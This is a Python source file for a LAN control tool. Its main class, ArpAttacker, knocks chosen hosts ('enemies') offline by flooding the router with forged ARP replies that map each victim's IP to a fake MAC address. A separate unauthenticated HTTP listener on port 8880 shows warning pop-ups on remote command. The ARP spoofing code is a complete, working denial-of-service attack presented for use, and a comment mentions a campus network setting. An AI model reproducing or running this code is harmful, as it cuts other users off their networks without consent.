import socket
import time
from http import server
import json
import tkinter
from tkinter import messagebox
import requests
import threading

from scapy.layers.inet import IP, ICMP
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sr1, srp1, sendp


def get_host_ip():
    # https://www.cnblogs.com/z-x-y/p/9529930.html
    """查询本机ip地址

    用于快速获取主机的IP地址

    Returns:
        一个字符串，表示IP地址
        例如：

        127.0.0.1
    """
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    finally:
        if s is not None:
            s.close()

    return ip


class ControlHandler(server.BaseHTTPRequestHandler):
    """用来处理收到的GET请求

    只作为工具来处理当主机作为slave时，
    如何处理来自master的指令
    """

    def do_GET(self):
        """获取来自主机的参数，并根据参数进行反应"""
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        data = {'result': 'ok'}
        self.wfile.write(json.dumps(data).encode())
        data_len = int(self.headers['Content-Length'])
        param = self.rfile.read(data_len).decode()

        if param[:13] == 'param=warning':
            # 显示警告框
            root = tkinter.Tk()
            root.withdraw()
            messagebox.showwarning('alert title', param[13:])

        elif param[:13] == 'param=cutdown':
            # TODO 断网
            pass


class ArpAttacker(object):
    """用于实现对多个用户的断网操作

    用于随时添加新断网对象，删除断网对象

    :argument
        router_ip: 当前局域网路由器的IP地址
        router_mac: 当前局域网路由器的MAC地址
        enemies: 字典，存放每一个被断网主机的 "断网标志位"
                 标志位False表示还在断网，True表示已恢复正常
    """
    router_ip: str
    router_mac: str
    enemies: dict

    def __init__(self):
        self.router_ip, self.router_mac = self.get_router()
        self.enemies = {}

    @staticmethod
    def get_router():
        """获取路由器的IP地址和MAC地址

        原理是发送TTL为1的ICMP包，根据收到的ARP-request获取路由器IP地址

        :returns
            返回IP地址和MAC地址的元组，两tractrac个返回值都是str类型
            例如：

            (192.168.1.1, 12:34:56:78:90:12)
        """
        # TODO 在校园网环境下的BUG修复
        a = IP(dst='baidu.com', ttl=1) / ICMP() / "hello?"
        router = sr1(a, timeout=1, verbose=0)
        router_ip = router["IP"].src
        a = Ether(dst='FF:FF:FF:FF:FF:FF') \
            / ARP(op=1, hwdst='00:00:00:00:00:00', pdst=router_ip)
        router = srp1(a, timeout=1, verbose=0)
        router_mac = router["ARP"].hwsrc

        return router_ip, router_mac

    @staticmethod
    def attack(packet, stop):
        """一直发送已经构造好的包，达到攻击的目的"""
        while True:
            if stop(): break
            sendp(packet, verbose=0)
            time.sleep(0.5)

    def add(self, enemy_ip):
        """对同一个局域网的特定IP地址进行攻击，使其断网"""
        self.enemies[enemy_ip] = False

        a = Ether(dst=self.router_mac) \
            / ARP(op=2, hwdst=self.router_mac, pdst=self.router_ip,
                  hwsrc="00:00:00:00:23:12", psrc=enemy_ip)

        th = threading.Thread(target=self.attack,
                              args=(a, lambda: self.enemies[enemy_ip]))
        th.daemon = True
        th.start()

    def delete(self, enemy_ip):
        """恢复一个主机的网络"""
        if self.enemies.__contains__(enemy_ip):
            self.enemies[enemy_ip] = True

    def delete_all(self):
        """恢复所有主机的网络"""
        for key in self.enemies.keys():
            self.enemies[key] = True


class Control(object):
    """用于执行发警告，断网操作

    作为管理员，可以向已知IP地址的slave发送命令
    作为slave，接收管理员命令并且执行相应指令

    :argument
        __host: 指定自己的IP地址和端口
        Handle: 作为slave启动时的server服务
        arp_attacker: 用来断网的工具类
    """
    __host: tuple
    Handle: server.HTTPServer
    arp_attacker: ArpAttacker

    def __init__(self):
        '''从机一定要设置，主机可以用localhost'''
        IP = get_host_ip()
        print('host name = ' + IP)
        self.__host = (IP, 8880)
        self.arp_attacker = ArpAttacker()

    def do_listen(self):
        self.Handle = server.HTTPServer(self.__host, ControlHandler)
        self.Handle.serve_forever()

    def as_a_slave(self):
        """自动创建进程，防止被阻塞在这一函数"""
        th = threading.Thread(target=self.do_listen)
        th.daemon = True
        th.start()

    @staticmethod
    def warning(IP, msg):
        """发送警告"""
        datas = {'param': 'warning' + msg}
        r = requests.get("http://" + IP + ":8880", data=datas)
        print(r.text)
        # print(r.status_code)

    def disconnection(self, IP):
        """用ARP攻击的方式令该主机断网"""
        self.arp_attacker.add(IP)

    def connection(self, IP):
        """停止对该主机的ARP断网攻击"""
        self.arp_attacker.delete(IP)

    def connection_all(self):
        """恢复所有主机的网络"""
        self.arp_attacker.delete_all()
